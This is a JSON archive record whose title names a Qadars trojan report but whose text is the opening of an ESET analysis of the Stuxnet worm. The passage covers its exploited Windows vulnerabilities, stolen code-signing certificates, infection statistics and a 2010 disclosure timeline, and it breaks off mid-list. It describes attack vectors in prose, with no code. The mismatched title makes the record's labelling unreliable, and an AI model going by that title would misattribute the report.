{
    "id": "59d206ef-faa2-4eca-92a5-36a3fecede13",
    "created_at": "2022-10-25T16:48:11.187585Z",
    "updated_at": "2025-03-27T02:05:40.575991Z",
    "deleted_at": null,
    "sha1_hash": "65a945f04db630840a0454ca6aa9f6e60fdbaf3c",
    "title": "2016-09-20 - Meanwhile in Britain, Qadars v3 Hardens Evasion, Targets 18 UK Banks",
    "authors": "",
    "file_creation_date": "2010-10-15T18:57:30Z",
    "file_modification_date": "2010-10-15T18:57:30Z",
    "file_size": 2359940,
    "plain_text": "# Stuxnet Under the Microscope \n\n### Revision 1.1\n\n#### Aleksandr Matrosov, Senior Virus Researcher\n\n Eugene Rodionov, Rootkit Analyst\n\n David Harley, Senior Research Fellow\n\n Juraj Malcho, Head of Virus Laboratory\n\n\n-----\n\n## Contents\n\n**PREFACE ................................................................................................................................................... 4**\n\n**1** **INTRODUCTION ................................................................................................................................. 5**\n\n1.1 TARGETED ATTACKS ............................................................................................................................. 5\n\n1.2 STUXNET VERSUS AURORA ..................................................................................................................... 7\n\n1.3 STUXNET REVEALED............................................................................................................................ 11\n\n1.4 STATISTICS ON THE SPREAD OF THE STUXNET WORM ................................................................................ 15\n\n**2** **MICROSOFT, MALWARE AND THE MEDIA ....................................................................................... 17**\n\n2.1 SCADA, SIEMENS AND STUXNET .......................................................................................................... 17\n\n2.2 STUXNET TIMELINE............................................................................................................................. 18\n\n**3** **DISTRIBUTION ................................................................................................................................. 21**\n\n3.1 THE LNK EXPLOIT .............................................................................................................................. 21\n\n_3.1.1_ _Propagation via External Storage Devices ............................................................................... 24_\n\n_3.1.2_ _Metasploit and WebDAV Exploit .............................................................................................. 24_\n\n_3.1.3_ _What Do DLL Hijacking Flaws and the LNK Exploit have in Common? ..................................... 24_\n\n3.2 LNK VULNERABILITY IN STUXNET .......................................................................................................... 26\n\n3.3 THE MS10-061 ATTACK VECTOR ......................................................................................................... 28\n\n3.4 NETWORK SHARED FOLDERS AND RPC VULNERABILITY (MS08-067) ......................................................... 31\n\n3.5 0-DAY IN WIN32K.SYS (MS10-073) .................................................................................................... 32\n\n**3.6** **EXPLOITING UNPATCHED 0-DAY IN TASK SCHEDULER ................................................................. 37**\n\n**4** **STUXNET IMPLEMENTATION ........................................................................................................... 38**\n\n4.1 USER-MODE FUNCTIONALITY ................................................................................................................ 38\n\n_4.1.1_ _Overview of the main module .................................................................................................. 38_\n\n_4.1.2_ _Injecting code ........................................................................................................................... 39_\n\n_4.1.3_ _Injecting into a current process ................................................................................................ 39_\n\n_4.1.4_ _Injecting into a new process ..................................................................................................... 42_\n\n_4.1.5_ _Installation ............................................................................................................................... 42_\n\n_4.1.6_ _Exported functions.................................................................................................................... 44_\n\n_4.1.7_ _RPC Server ................................................................................................................................ 48_\n\n\n-----\n\n_4.1.8_ _Resources ................................................................................................................................. 50_\n\n4.2 KERNEL-MODE FUNCTIONALITY ............................................................................................................. 50\n\n_4.2.1_ _MRXCLS.sys ............................................................................................................................... 52_\n\n_4.2.2_ _MRXNET.sys .............................................................................................................................. 56_\n\n4.3 STUXNET BOT CONFIGURATION DATA .................................................................................................... 57\n\n4.4 REMOTE COMMUNICATION PROTOCOL .................................................................................................. 58\n\n**CONCLUSION .......................................................................................................................................... 62**\n\n**APPENDIX A ............................................................................................................................................ 63**\n\n**APPENDIX B ............................................................................................................................................ 65**\n\n**APPENDIX C ............................................................................................................................................ 66**\n\n\n-----\n\n## Preface\n\nThis report is devoted to the analysis of the notorious Stuxnet worm (Win32/Stuxnet) that suddenly\nattracted the attention of virus researchers this summer. This report is primarily intended to describe\ntargeted and semi-targeted attacks, and how they are implemented, focusing mainly on the most\nrecent, namely Stuxnet. This attack is, however, compared to the Aurora attack, outlining the similarities\nand differences between the two attacks.\n\nThe paper is structured as follows. In the first section we introduce the targeted attacks and their\ncommon characteristics and goals. In this section we present comparison of two attacks: Stuxnet vs.\nAurora. The second section contains some general information on SCADA (Supervisory Control And Data\nAcquisition) systems and PLCs (Programmable Logic Controllers) as Stuxnet’s primary targets of. The\nthird section covers the distribution of the Stuxnet worm. Here we describe vulnerabilities that it\nexploits to infect the target machine. The next section describes the implementation of Stuxnet: usermode and kernel-mode components, RPC Server and their interconnection. We also describe the\nremote communication protocol that it uses to communicate with the remote C&C.\n\n\n-----\n\n## 1 Introduction\n\nRecently, there has been increased public awareness and information about targeted attacks as the\nnumber of such attacks has significantly increased, becoming a separate cybercriminal business sector in\nits own right.\n\nMany companies are reluctant to disclose information about attempted or successful targeted attacks\nfor fear of public relations issues affecting their profits, so the information made available to the public\nonly represents a small part of what is actually happening.\n\n### 1.1 Targeted Attacks\n\nAll targeted attacks can be divided into two major classes:\n\n    - **Targeting a specific company or organization - this type of attack is directed at a specific**\norganization and the aim of an intruder is unauthorized access to confidential information such\nas commercial secrets (as with the Aurora attack).\n\n    - **Targeting specific software or IT infrastructure - this type of attack is not directed at a**\nspecific company and its target is the data associated with a certain kind of software, for\nexample -banking client software or SCADA systems. Such attacks have to be implemented in a\nmore flexible manner. This class of attacks can do much more damage to a great number of\ncompanies than the attacks of the first class. As this class pre-supposes a long term attack, it is\ndesigned to circumvent protection systems (as with the Stuxnet attack).\n\nThe most common vector for the development of targeted external attacks is now considered to be the\nexploitation of vulnerabilities in popular client-side applications (browsers, plugins and so on). Attackers\ntypically use combinations of multiple steps, which allow them to take root on the client-side. In most\ncases the first stage of the attack employs social engineering to allow an attacker to lure the victim to a\nfavorable environment for the implementation of the next attack phase.\n\n**Figure 1.1 – Typical Stages of Client-Side Attack**\n\n\n-----\n\nBypassing the security software installed in certain organizations is a crucial objective for most malware.\nThere is a separate cybercriminal business sector devoted to providing the means for malicious software\nto stay undetected by specific or widely spread antivirus products.\n\n**Figure 1.2 – Custom Malware Protector**\n\nThis kind of service can extend the life of outdated malware, or extend the time new threats stay\nundetected. However, the use of such technologies to resist detection by antivirus software can be used\nas a heuristic for the detection of previously unknown samples. But the converse case also holds true:\navoiding using any techniques aimed at bypassing antivirus software and making the program resemble\nlegitimate software more closely can be a way of protecting malware. This is the case with the attack\nmechanism used by the Stuxnet worm.\n\nThe Stuxnet attack constituted a serious threat to trust in software using legal digital signatures. This\ncreates a problem for white-listing, where security software is based on the a priori assumption that a\ntrusted program meets certain conditions and is therefore indeed trustworthy. And what if the program\nclosely resembles legitimate software and even has digital certificates for installed modules published in\nthe name of reputable companies? All this suggests that targeted attacks could persist much longer over\ntime than we previously imagined. Stuxnet was able to stay undetected for a substantial period where\nno one saw anything suspicious. The use of a self-launching, 0-day vulnerability in the attack allowed the\nrapid distribution of Stuxnet in the targeted region. The choice of this kind of vulnerability is quite\ndeliberate, because in the absence of information about its existence, use of the exploit will not be\ndetected. All these facts suggest a well-planned attack which remained unnoticed until long after it was\nlaunched. But it is precisely the existence of such threats that inspires us to look at the new vector and\nthe possibility of attacks that use it, in order to reduce the impact of future attacks.\n\n\n-----\n\n### 1.2 Stuxnet versus Aurora \n\nIn the past year, the public has become aware of two targeted attacks, codenamed Stuxnet and Aurora.\nBoth of these attacks have some common features that characterize recent trends in targeted attacks.\nNowadays, the most popular vector of penetration of the user’s machine is realized through popular\nclient-side applications (browsers, plugins and other apps). It is much easier to steal data by launching\nan indirect attack on people with access to important information via a malicious web site, than it is to\nattack the company’s well-protected database server directly. The use of client-side applications as a\nvector of attack is undoubtedly expected by cautious system users and administrators, but this attack\nmethodology is less predictable and harder to protect against, since in everyday life we use many\napplications, each of them potentially an attack vector.\n\nThe Aurora and Stuxnet attacks used 0-day exploits to install malicious programs onto the system. Table\n1.2.1 presents data on the malicious programs and exploits used:\n\n**Table 1.2.1 – Malicious Software and Exploits Used to Perform Attacks**\n\n**Characteristics** **Aurora** **Stuxnet**\n\nExploitation vector MS10-002 (0-day) MS10-046 (0-day)\n\nMS10-061 (0-day)\n\nMS08-067 (patched)\n\n0-day (unpatched)\n\nTargeted malicious program Win32/Vedrio Win32/Stuxnet\n\nTable 1.2.2 displays the characteristics of vulnerable platform and exploits, and indicates how seriously\nthe intruders take their attacks.\n\n|Characteristics|Aurora|Stuxnet|\n|---|---|---|\n|Exploitation vector|MS10-002 (0-day)|MS10-046 (0-day) MS10-061 (0-day) MS08-067 (patched) 0-day (unpatched)|\n|Targeted malicious program|Win32/Vedrio|Win32/Stuxnet|\n\n\n-----\n\n**Table 1.2.2 – Platforms Vulnerable to 0-Day Attack Vector**\n\n**Characteristics** **MS10-002** **MS10-046** **MS10-061** **0-day**\n**(unpatched)**\n\nVulnerable versions all versions of MS all versions of MS all versions of MS WinXP and\n\nInternet Explorer Windows (WinXP, Windows (WinXP, Win2000\n\n(6, 7, 8) Vista, 7, …) Vista, 7, …)\n\nLayered shellcode yes no no yes\n\nRemote attacks yes yes yes (only for no\n\nWinXP)\n\nOther vectors no yes yes no\n\nThe exploit ESET detects as JS/Exploit.CVE-2010-0249 (MS10-002) has a narrower range of possible\nvectors of distribution than LNK/Exploit.CVE-2010-2568 (MS10-046). The range of vulnerabilities used in\nthe Stuxnet attack have other interesting features making use of such infection vectors as removable\nflash drives and other USB devices, and resources shared over the network. The exploit LNK/Exploit.CVE2010-2568 is by its nature so designed that detection of the exploit’s malicious activity is impossible, if\nyou are not aware of its existence. If we compare the features of these two exploits, it seems that\nJS/Exploit.CVE-2010-0249 is designed for a surprise attack, while in the case of LNK/Exploit.CVE-20102568 a long-term, persistent attack was intended. An additional propagation vector (MS10-061) can\nspread rapidly within the local network. These observations confirm the data from Table 1.2.3, which\ncompares the characteristics of the malicious programs used in these attacks.\n\n|Characteristics|MS10-002|MS10-046|MS10-061|0-day (unpatched)|\n|---|---|---|---|---|\n|Vulnerable versions|all versions of MS Internet Explorer (6, 7, 8)|all versions of MS Windows (WinXP, Vista, 7, …)|all versions of MS Windows (WinXP, Vista, 7, …)|WinXP and Win2000|\n|Layered shellcode|yes|no|no|yes|\n|Remote attacks|yes|yes|yes (only for WinXP)|no|\n|Other vectors|no|yes|yes|no|\n\n\n-----\n\n**Table 1.2.3 – Comparison of attacks**\n\n**Characteristics** **Aurora** **Stuxnet**\n\nTarget Targeted group of specific Sites using SCADA systems but\n\ncompanies promiscuous dissemination\n\nMultiple distribution vectors no yes\n\nPayload download in process infecting all in one malware\n\nCode packing yes yes\n\nCode obfuscation yes yes\n\nAnti-AV functionality yes yes\n\nMasking under legal programs yes yes\n\nArchitecture of malicious modular modular\nprogram\n\nEstablishing a backdoor yes no\n\nDistributed C&C yes no\n\nCommunications protocol https http\n\nCustom encryption of yes yes\ncommunications protocol\n\nModules with a legal digital no yes\nsignature\n\nyes; downloads and runs the yes; downloads updates via\n\ndownloaded module via WinAPI functions and runs\n\nUpdate mechanism\n\nWinAPI them in memory, without\n\ncreating any files\n\nUninstall mechanism no yes\n\nInfection counter no yes\n\nAvailability of any modifications no yes\nmalicious program\n\nThese two attacks have shown us that no information system is absolutely secure and carefully planned\ntargeted or even semi-targeted attacks put a serious weapon into the hands of bad guys. In the case of\nStuxnet there are still a lot of open questions, in our report we try to highlight the technical component\nof this semi-targeted attack. Stuxnet showed us by example how much can be conceived and achieved\nusing massive semi-targeted attacks.\n\n|Characteristics|Aurora|Stuxnet|\n|---|---|---|\n|Target|Targeted group of specific companies|Sites using SCADA systems but promiscuous dissemination|\n|Multiple distribution vectors|no|yes|\n|Payload|download in process infecting|all in one malware|\n|Code packing|yes|yes|\n|Code obfuscation|yes|yes|\n|Anti-AV functionality|yes|yes|\n|Masking under legal programs|yes|yes|\n|Architecture of malicious program|modular|modular|\n|Establishing a backdoor|yes|no|\n|Distributed C&C|yes|no|\n|Communications protocol|https|http|\n|Custom encryption of communications protocol|yes|yes|\n|Modules with a legal digital signature|no|yes|\n|Update mechanism|yes; downloads and runs the downloaded module via WinAPI|yes; downloads updates via WinAPI functions and runs them in memory, without creating any files|\n|Uninstall mechanism|no|yes|\n|Infection counter|no|yes|\n|Availability of any modifications malicious program|no|yes|\n\n\n-----\n\nWhy semi-targeted? While the payload is plainly focused on SCADA systems, the malware’s propagation\nis promiscuous. Criminal (and nation-state funded) malware developers have generally moved away\nfrom the use of self-replicating malware towards Trojans spread by other means (spammed URLs, PDFs\nand Microsoft Office documents compromised with 0-day exploits, and so on). Once self-replicating\ncode is released, it’s difficult to exercise complete control over where it goes, what it does, and how far\nit spreads (which is one of the reasons reputable researchers have always been opposed to the use of\n“good” viruses and worms: for the bad guys, it also has the disadvantage that as malware becomes\nmore prevalent and therefore more visible, its usefulness in terms of payload delivery is depleted by\npublic awareness and the wider availability of protection).\n\nAs we describe elsewhere in this document, there were probably a number of participants in the\nStuxnet development project who may have very different backgrounds. However, some of the code\nlooks as if it originated with a \"regular\" software developer with extensive knowledge of SCADA systems\nand/or Siemens control systems, rather than with the criminal gangs responsible for most malcode, or\neven the freelance hacker groups, sometimes thought to be funded by governments and the military,\n(for example Wicked Rose) we often associate with targeted attacks. However, it’s feasible that what\nwe’re seeing here is the work of a more formally-constituted, multi-disciplinary “tiger team”. Such\nofficially but unpublicized collaborations, resembling the cooperative work with other agencies that\nanti-malware researchers sometimes engage in, might be more common than we are actually aware.\n\nOn the other hand, the nature of the .LNK vulnerability means that even though the mechanism is\ndifferent to the Autorun mechanism exploited by so much malware in recent years, its use for delivery\nthrough USB devices, removable media, and network shares, has resulted in wide enough propagation\nto prevent the malware from remaining “below the radar”. This may signify misjudgement on the part of\na development team that nevertheless succeeded in putting together a sophisticated collaborative\nproject, or a miscommunication at some point in the development process. On the other hand, it may\nsimply mean that the group was familiar enough with the modus operandi characteristic of SCADA sites\nto gamble on the likelihood that Stuxnet would hit enough poorly-defended, poorly-patched and poorlyregulated PLCs to gain them the information and control they wanted. Since at the time of writing it has\nbeen reported by various sources that some 14 or 15 SCADA sites have been directly affected by the\ninfection of PLCs (Programmable Logic Controllers), the latter proposition may have some validity. While\nthe use of these vectors has increased the visibility of the threat, it’s likely that it has also enabled access\nto sites where “air-gapped” generic defences were prioritized over automated technical defences like\nanti-virus, and less automated system updating and patching. This is not a minor consideration, since\nthe withdrawal of support from Windows versions earlier than Windows XP SP3. At the same time, it’s\nclear that there are difficulties for some sites where protective measures may involve taking critical\nsystems offline. While there are obvious concerns here concerning SPoFs (single points of failure), the\npotential problems associated with fixing such issues retrospectively should not be underestimated.\n\n\n-----\n\n### 1.3 Stuxnet Revealed\n\nDuring our research, we have been constantly finding evidence confirming that the Stuxnet attack was\ncarefully prepared. Timestamp in the file _~wtr4141.tmp indicates that the date of compilation was_\n03/02/2010.\n\n**Figure 1.3 – Header Information from ~wtr4141.tmp**\n\nVersion 9.0 of the linker indicated that attackers used MS Visual Studio 2008 for developing Stuxnet's\ncomponents. File _~wtr4141.tmp_ is digitally signed, and the timestamp indicates that the signature on\nthe date of signing coincides with the time of compilation.\n\n**Figure 1.4 – Digital Signature Information from ~wtr4141.tmp**\n\nExamination of the driver is even more interesting, since the timestamp of MRXCLS.sys indicates that it\nwas compiled on 01/01/2009. An 8.0 version of the linker used to build it suggests that MS Visual Studio\n2005 was for development. Using different versions of the linker may indicate as well that this project\nwas developed by a group of people with a clear division of responsibilities.\n\n\n-----\n\n**Figure 1.5 – Header information from MRXCLS.sys**\n\nThe digital signature shows a later date 25/01/2010, indicating that this module, was available very early\non, or was borrowed from another project.\n\n**Figure 1.6 – Digital Signature Information from MRXCLS.sys**\n\nThe second driver was built later and a timestamp of compilation shows 25/01/2010, coinciding with the\ndate of signature of the driver MRXCLS.sys. The same linker version was used and maybe these two\ndrivers were created by one and the same person.\n\n**Figure 1.7 – Header Information from MRXNET.sys**\n\nThe timestamp signature also coincides, and it all seems to point to the date of release for this\ncomponent.\n\n\n-----\n\n**Figure 1.8 – Digital Signature Information from MRXNET.sys**\n\nOn July 17th, ESET identified a new driver named jmidebs.sys, compiled on July 14th 2010, and signed\nwith a certificate from a company called \"JMicron Technology Corp\". This is different from the previous\ndrivers which were signed with the certificate from Realtek Semiconductor Corp. It is interesting to note\nthat both companies whose code signing certificates were used have offices in Hsinchu Science Park,\nTaiwan. The physical proximity of the two companies may suggest physical theft, but it's also been\nsuggested that the certificates may have been bought from another source. For instance, the Zeus\nbotnet is known to steal certificates, though it probably focuses on banking certificates. (As Randy\nAbrams pointed out: http://blog.eset.com/2010/07/22/why-steal-digital-certificates.)\n\nThe file jmidebs.sys functions in much the same way as the earlier system drivers, injecting code into\nprocesses running on an infected machine. As Pierre-Marc Bureau pointed out in a blog at the time, it\nwasn't clear whether the attackers changed their certificate because the first one was exposed, or were\nsimply using different certificates for different attacks. Either way, they obviously have significant\nresources to draw on. The well-planned modular architecture that characterizes the Stuxnet malware,\nand the large number of modules used, suggests the involvement of a fairly large and well-organized\n[group. (See: http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries).](http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries)\n\n**Figure 1.9 – Certificate Issued to JMicron Technology Corporation**\n\nAnother interesting finding was the string b:\\myrtus\\src\\objfre_w2k_x86\\i386\\guava.pdb found\nin the resource section.\n\n\n-----\n\n**Figure 1.10 – Interesting String in MRXNET.sys**\n\nThe number of modules included in Stuxnet and the bulkiness of the developed code indicate\nthat this malicious program was developed by a large group of people. Stuxnet is a more mature and\ntechnologically advanced (semi-)targeted attack than Aurora.\n\n\n-----\n\n### 1.4 Statistics on the Spread of the Stuxnet Worm \n\nThe statistical distribution of infected machines Win32/Stuxnet global, from the beginning of the\ndetection to the end of September, is presented in the figure below:\n\n**Figure 1.11 – Global infection by Win32/Stuxnet (Top 14 Countries)**\n\nAsian countries are the leaders with the largest number of Stuxnet-infected machines by. Iran is\nthe region where the widest spread Stuxnet has been seen. If we look at the percentage distribution of\nthe number of infections by region, we can generate the following table:\n\n**Table 1.4.1 – The Percentage Distribution of Infections by Region**\n\n**Iran** **Indonesia** **India** **Pakistan** **Uzbekistan** **Russia** **Kazakhstan** **Belarus**\n\n52,2% 17,4% 11,3% 3,6% 2,6% 2,1% 1,3% 1,1%\n\n**Kyrgyzstan** **Azerbaijan** **United** **Cuba** **Tajikistan** **Afghanistan** **Rest of the world**\n\n**States**\n\n1,0% 0,7% 0,6% 0,6% 0,5% 0,3% 4,6%\n\nA high volume of detections in a single region may mean that it is the major target of attackers.\nHowever, multiple targets may exist, and the promiscuous nature of the infective mechanism is likely to\ntargeting detail. In fact, even known infection of a SCADA site isn’t incontrovertible evidence that the\nsite was specifically targeted. It has been suggested that malware could have been spread via flash\ndrives distributed at a SCADA conference or event (as Randy Abrams pointed out in a blog at\n\n|Iran|Indonesia|India|Pakistan|Uzbekistan|Russia|Kazakhstan|Belarus|\n|---|---|---|---|---|---|---|---|\n|52,2%|17,4%|11,3%|3,6%|2,6%|2,1%|1,3%|1,1%|\n|Kyrgyzstan|Azerbaijan|United States|Cuba|Tajikistan|Afghanistan|Rest of the world||\n|1,0%|0,7%|0,6%|0,6%|0,5%|0,3%|4,6%||\n\n\n-----\n\n[http://blog.eset.com/2010/07/19/which-army-attacked-the-power-grids.](http://blog.eset.com/2010/07/19/which-army-attacked-the-power-grids) Even that would argue\ntargeting of the sector rather than individual sites, and that targeting is obvious from the payload.\nDistribution, however, is influenced by a number of factors apart from targeting, such as local\navailability of security software and adherence to good update/patching practice. Furthermore, our\nstatistics show that the distribution of infections from the earliest days of detection shows a steep\ndecline even in heavily-affected Iran in the days following the initial discovery of the attack, followed by\na more gradual decline over subsequent months.\n\nHowever, the sparse information we have about actual infection of SCADA sites using (and affecting)\nSiemens software suggests that about a third of the sites affected are in the German process industry\nsector. Siemens have not reported finding any active instances of the worm: in other words, it has\nchecked out PLCs at these sites, but it hasn’t attempted to manipulate them. Heise observes that:\n\n“The worm seems to look for specific types of systems to manipulate. Siemens couldn't provide\nany details about which systems precisely are or could be affected.”\n```\n(http://www.h-online.com/security/news/item/Stuxnet-also-found-at-industrial-plants-in-Germany\n```\n[1081469.html)](http://www.h-online.com/security/news/item/Stuxnet-also-found-at-industrial-plants-in-Germany-1081469.html)\n\nComprehensive analysis of how Stuxnet behaves when it hits a vulnerable installation was published by\nRalph Langner, ahead of the ACS conference in Rockville in September 2010.\n\nHowever, the Langner analysis is contradicted in some crucial respects by analysis from other sources\n[(http://www.symantec.com/connect/blogs/exploring-stuxnet-s-plc-infection-process). There was also](http://www.symantec.com/connect/blogs/exploring-stuxnet-s-plc-infection-process)\nsome fascinating conjecture on display in an interview with Jonathan Weiss.\n\n(http://www.pbs.org/wgbh/pages/frontline/shows/cyberwar/interviews/weiss.html)\n\n\n-----\n\n## 2 Microsoft, Malware and the Media\n\nWhile Stuxnet exploits several Windows vulnerabilities, at least four of them described as 0-day:\n\n    - MS08-067 RPC Exploit (http://www.microsoft.com/technet/security/bulletin/ms10[067.mspx)](http://www.microsoft.com/technet/security/bulletin/ms10-067.mspx)\n\n    - [MS10-046 LNK Exploit (http://www.microsoft.com/technet/security/bulletin/ms10-](http://www.microsoft.com/technet/security/bulletin/ms10-046.mspx)\n[046.mspx)](http://www.microsoft.com/technet/security/bulletin/ms10-046.mspx)\n\n    - MS10-061 Spool Server Exploit\n[(http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx)](http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx)\n\n    - Two as yet unpatched privilege escalation (or Elevation of Privilege) vulnerabilities\n\nHowever, it also targets PLCs (Programming Logic Controllers) on sites using Siemens SIMATIC WinCC or\nSTEP 7 SCADA (Supervisory Control And Data Acquisition) systems.\n\n### 2.1 SCADA, Siemens and Stuxnet\n\nThis attack makes additional use of a further vulnerability categorized as CVE-2010-2772, relating to the\nuse of a hard-coded password in those systems allowing a local user to access a back-end database and\ngain privileged access to the system. This meant not only that the password was exposed to an attacker\nthrough reverse engineering, but, in this case, that the system would not continue to work if the\npassword was changed, though that issue was not mentioned in Siemens’ advice to its customers at\n[http://support.automation.siemens.com/WW/view/en/43876783.](http://support.automation.siemens.com/WW/view/en/43876783) Industrial Controls Engineer Jake\nBrodsky made some very pertinent comments in response to David Harley’s blog at\n[http://blog.eset.com/2010/07/20/theres-passwording-and-theres-security.](http://blog.eset.com/2010/07/20/theres-passwording-and-theres-security)\n\nWhile agreeing that strategically, Siemens were misguided to keep hardcoding the same access account\nand password into the products in question, and naive in expecting those details to stay secret, Jake\npointed out, perfectly reasonably, that tactically, it would be impractical for many sites to take\nappropriate remedial measures without a great deal of preparation, recognizing that a critical system\ncan’t be taken down without implementing interim maintenance measures. He suggested, therefore,\nthat isolation of affected systems from the network was likely to be a better short-term measure,\ncombined with the interim measures suggested by Microsoft for working around the .LNK and .PIF\n[issues that were causing concern at the time (http://support.microsoft.com/kb/2286198).](http://support.microsoft.com/kb/2286198)\n\n\n-----\n\n### 2.2 Stuxnet Timeline \n\nVirusBlokAda reportedly detected Stuxnet components as Trojan-Spy.0485 and Malware[Cryptor.Win32.Inject.gen on 17[th] June 2010 (http://www.anti-virus.by/en/tempo.shtml), and also](http://www.anti-virus.by/en/tempo.shtml)\ndescribed the .LNK vulnerability on which most of the subsequent attention was focused. However, it\nseems that Microsoft, like most of the security industry, only became aware (or publicly acknowledged)\n[the problem in July. (See: http://blogs.technet.com/b/msrc/archive/2010/09/13/september-2010-](http://blogs.technet.com/b/msrc/archive/2010/09/13/september-2010-security-bulletin-release.aspx)\n[security-bulletin-release.aspx)](http://blogs.technet.com/b/msrc/archive/2010/09/13/september-2010-security-bulletin-release.aspx)\n\nRealtek Semiconductor were notified of the theft of their digital signature keys on 24[th] June 2010.\n[(http://www.f-secure.com/weblog/archives/new_rootkit_en.pdf).](http://www.f-secure.com/weblog/archives/new_rootkit_en.pdf)\n\nESET was already detecting some components of the attack generically early in July 2010, but the\nmagnitude of the problem only started to become obvious later that month. Siemens don’t seem to\nhave been notified (or at any rate acknowledged receipt of notification) until 14[th] July 2010.\n[http://www.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx.sea.siemens.com/us/New](http://www.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx)\n[s/Industrial/Pages/WinCC_Update.aspx. On the same day, another driver was compiled as subsequently](http://www.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx)\n[revealed by ESET analysis and reported on 19[th] July: http://blog.eset.com/2010/07/19/win32stuxnet-](http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries)\n[signed-binaries](http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries)\n\nOn the 15[th] July, advisories were posted by US-CERT and ICS-CERT\n[(http://www.kb.cert.org/vuls/id/940193; http://www.us-cert.gov/control_systems/pdf/ICSA-10-201-](http://www.kb.cert.org/vuls/id/940193)\n[01%20-%20USB%20Malware%20Targeting%20Siemens%20Control%20Software.pdf.)](http://www.us-cert.gov/control_systems/pdf/ICSA-10-201-01%20-%20USB%20Malware%20Targeting%20Siemens%20Control%20Software.pdf)\n\nA Microsoft advisory was posted on 16[th] July\n[(http://www.microsoft.com/technet/security/advisory/2286198.mspx), supplemented by a Technet](http://www.microsoft.com/technet/security/advisory/2286198.mspx)\n[blog (http://blogs.technet.com/b/mmpc/archive/2010/07/16/the-stuxnet-sting.aspx). The Internet](http://blogs.technet.com/b/mmpc/archive/2010/07/16/the-stuxnet-sting.aspx)\n[Storm Center also commented: http://isc.sans.edu/diary.html?storyid=9181. See also MITRE Common](http://isc.sans.edu/diary.html?storyid=9181)\n[Vulnerabilities and Exposures (CVE) #CVE-2010-2568 http://www.cve.mitre.org/cgi-](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568)\n[bin/cvename.cgi?name=CVE-2010-2568](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568)\n\n[Microsoft Security Advisory #2286198 Workaround: http://support.microsoft.com/kb/2286198;](http://support.microsoft.com/kb/2286198)\n[http://go.microsoft.com/?linkid=9738980; http://go.microsoft.com/?linkid=9738981;](http://go.microsoft.com/?linkid=9738980)\n[http://www.microsoft.com/technet/security/advisory/2286198.mspx](http://www.microsoft.com/technet/security/advisory/2286198.mspx)\n\nOn the 17[th] July, the Verisign certificate assigned to Realtek Semiconductor was revoked\n[(http://threatpost.com/en_us/blogs/verisign-revokes-certificate-used-sign-stuxnet-malware-071710).](http://threatpost.com/en_us/blogs/verisign-revokes-certificate-used-sign-stuxnet-malware-071710)\nHowever, the second driver, now using a JMicron certificate was identified:\n[http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries. The first of a comprehensive series of](http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries)\nESET blogs was posted.\n\n\n-----\n\n**Table 2.2.1 – Stuxnet-Related Blogs by ESET**\n\n**Date** **Article**\n\nSeptember 9 New Papers and Articles\n\nAugust 25 21st Century Hunter-Killer UAV Enters Restricted DC\n[Airspace – Skynet Alive?](http://blog.eset.com/2010/08/25/rise-of-the-machines-navy-uav-goes-awol-malware-or-skynet)\n\nAugust 4 Assessing Intent\n\nAugust 2 Save Your Work! Microsoft Releases Critical Security\n[Patch](http://blog.eset.com/2010/08/02/save-your-work-microsoft-releases-critical-security-patch)\n\nJuly 27 More LNK exploiting malware, by Jove!*\n\nJuly 23 Link Exploits and the Search for a Better Explorer\n\nJuly 22 A few facts about Win32/Stuxnet & CVE-2010-2568\n\nJuly 22 Why Steal Digital Certificates?\n\nJuly 22 New malicious LNKs: here we go…\n\nJuly 22 Win32/Stuxnet: more news and resources\n\nJuly 20 There’s Passwording and there’s Security\n\nJuly 19 It Wasn’t an Army\n\nJuly 19 Win32/Stuxnet Signed Binaries\n\nJuly 19 Yet more on Win32/Stuxnet\n\nJuly 19 (Windows) Shellshocked, Or Why Win32/Stuxnet Sux…\n\nOn the 19[th] SANS posted an advisory regarding the .LNK vulnerability\n[(http://isc.sans.edu/diary.html?storyid=9190), and on the 19[th] and 20[th] July Siemens updated its posts:](http://isc.sans.edu/diary.html?storyid=9190)\n[http://www.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx](http://www.sea.siemens.com/us/News/Industrial/Pages/WinCC_Update.aspx)\n\nESET labs were now seeing low-grade Autorun worms, written in Visual Basic, experimenting with the\n.LNK vulnerability, and had added generic detection of the exploit (LNK/Exploit.CVE-2010-2568). Most\nAV companies had Stuxnet-specific detection by now, of course. The Internet Storm Center raised its\nInfocon level to yellow in order to raise awareness of the issue\n[(http://isc.sans.edu/diary.html?storyid=9190). Softpedia and Computerworld, among others, noted the](http://isc.sans.edu/diary.html?storyid=9190)\npublication of exploit code using the .LNK vulnerability.\n\nWired magazine reported that it was well-known that some Siemens products made use of hard-coded\n[passwords, as described above: http://www.wired.com/threatlevel/tag/siemens/](http://www.wired.com/threatlevel/tag/siemens/)\n\nSiemens has made quite a few advisories available, but has not really addressed the hard-coded\npassword issue directly, and some pages appear to have been withdrawn at the time of writing. The\nfollowing pages were still available:\n\n|Date|Article|\n|---|---|\n|September 9|New Papers and Articles|\n|August 25|21st Century Hunter-Killer UAV Enters Restricted DC Airspace – Skynet Alive?|\n|August 4|Assessing Intent|\n|August 2|Save Your Work! Microsoft Releases Critical Security Patch|\n|July 27|More LNK exploiting malware, by Jove!*|\n|July 23|Link Exploits and the Search for a Better Explorer|\n|July 22|A few facts about Win32/Stuxnet & CVE-2010-2568|\n|July 22|Why Steal Digital Certificates?|\n|July 22|New malicious LNKs: here we go…|\n|July 22|Win32/Stuxnet: more news and resources|\n|July 20|There’s Passwording and there’s Security|\n|July 19|It Wasn’t an Army|\n|July 19|Win32/Stuxnet Signed Binaries|\n|July 19|Yet more on Win32/Stuxnet|\n|July 19|(Windows) Shellshocked, Or Why Win32/Stuxnet Sux…|\n\n\n-----\n\n    - 